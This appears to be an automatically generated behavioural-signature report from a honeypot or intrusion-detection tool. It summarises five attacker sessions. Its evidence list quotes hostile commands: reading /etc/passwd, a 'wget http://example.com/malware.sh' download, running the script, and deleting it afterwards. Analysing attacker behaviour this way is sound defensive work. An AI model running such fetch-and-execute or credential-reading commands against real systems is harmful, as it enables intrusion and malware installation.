# Behavioural Signature Generation Report

- Signature schema version: 1.0
- Signatures generated: 1
- Low-confidence signatures: 0

## Signature summary
### sig-4e22763125d03876 (Mixed/Unclassified)
- Cluster ID: 1
- Supporting sessions: 5 (100.00%)
- Evidence strength: High (0.8375)
- Command categories: reconnaissance, file_system, file_transfer, networking, credential_attack, privilege_escalation, evasion, persistence
- Representative commands: cat /etc/passwd, exit, ls -la, pwd, uname -a
- Authentication profile: {"observed": true, "success_count": 5, "failure_count": 0, "success_rate": 100.0, "notes": "Authentication success/failure observed from session_details.json."}
- Supporting evidence: ["Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 12.314849", "Observed commands: cd /tmp, wget http://example.com/malware.sh; Command categories: file_system, file_transfer, networking, reconnaissance; Authentication success flag: 1; Session duration: 4.444169", "Observed commands: ./malware.sh, <!doctype html><html lang=en><head><meta charset=utf-8><link rel=icon href=data:,><meta name=viewport content=\"width=device-width,initial-scale=1\"><title>Example Domain</title><style>html{color-scheme:light dark;background:light-dark(#eee,#222)}body{font:16px/1.6 system-ui,sans-serif;max-width:26em;margin:auto;padding:25vh 2em 2em;text-align:center}</style></head><body><p>This domain is for use in documentation examples without needing permission. This is not a service; avoid relying on it for testing and monitoring purposes.</p><script src=/s.js></script></body></html>, cd /tmp, exit, rm malware.sh; Command categories: evasion, file_system, file_transfer, networking, persistence, reconnaissance; Authentication success flag: 1; Session duration: 4.960177", "Observed commands: cd /tmp, exit, wget http://example.com/malware.sh; Command categories: file_system, file_transfer, networking, reconnaissance; Authentication success flag: 1; Session duration: 3.161629", "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 11.842766"]
- Limitations: Behavioural interpretation is mixed or weakly supported by the available evidence.

